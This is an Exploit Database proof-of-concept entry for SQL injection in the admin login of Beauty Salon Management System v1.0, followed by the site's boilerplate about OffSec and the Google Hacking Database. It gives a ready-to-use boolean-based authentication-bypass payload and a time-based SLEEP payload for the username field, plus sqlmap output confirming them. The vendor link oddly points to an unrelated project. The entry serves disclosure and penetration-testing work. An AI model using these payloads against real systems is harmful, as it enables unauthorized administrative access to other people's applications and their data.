# Exploit Title: Beauty Salon Management System v1.0 - SQLi
# Date of found: 04/07/2023
# Exploit Author: Fatih Nacar
# Version: V1.0
# Tested on: Windows 10
# Vendor Homepage: https://www.campcodes.com <https://www.campcodes.com/projects/retro-cellphone-online-store-an-e-commerce-project-in-php-mysqli/>

# CWE: CWE-89

Vulnerability Description -

Beauty Salon Management System: V1.0, developed by Campcodes, has been
found to be vulnerable to SQL Injection (SQLI) attacks. This vulnerability
allows an attacker to manipulate login authentication with the SQL queries
and bypass authentication. The system fails to properly validate
user-supplied input in the username and password fields during the login
process, enabling an attacker to inject malicious SQL code. By exploiting
this vulnerability, an attacker can bypass authentication and gain
unauthorized access to the system.

Steps to Reproduce -

The following steps outline the exploitation of the SQL Injection
vulnerability in Beauty Salon Management System V1.0:

1. Open the admin login page by accessing the URL:
http://localhost/Chic%20Beauty%20Salon%20System/admin/index.php

2. In the username and password fields, insert the following SQL Injection
payload shown inside brackets to bypass authentication for usename
parameter:

{Payload: username=admin' AND 6374=(SELECT (CASE WHEN (6374=6374) THEN 6374
ELSE (SELECT 6483 UNION SELECT 1671) END))-- vqBh&password=test&login=Sign
In}

3.Execute the SQL Injection payload.

As a result of successful exploitation, the attacker gains unauthorized
access to the system and is logged in with administrative privileges.

Sqlmap results:

POST parameter 'username' is vulnerable. Do you want to keep testing the
others (if any)? [y/N] y

sqlmap identified the following injection point(s) with a total of 793
HTTP(s) requests:

---

Parameter: username (POST)

Type: boolean-based blind

Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)

Payload: username=admin' AND 6374=(SELECT (CASE WHEN (6374=6374) THEN 6374
ELSE (SELECT 6483 UNION SELECT 1671) END))-- vqBh&password=test&login=Sign
In

Type: time-based blind

Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)

Payload: username=admin' AND (SELECT 1468 FROM (SELECT(SLEEP(5)))qZVk)--
rvYF&password=test&login=Sign In

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Tes...
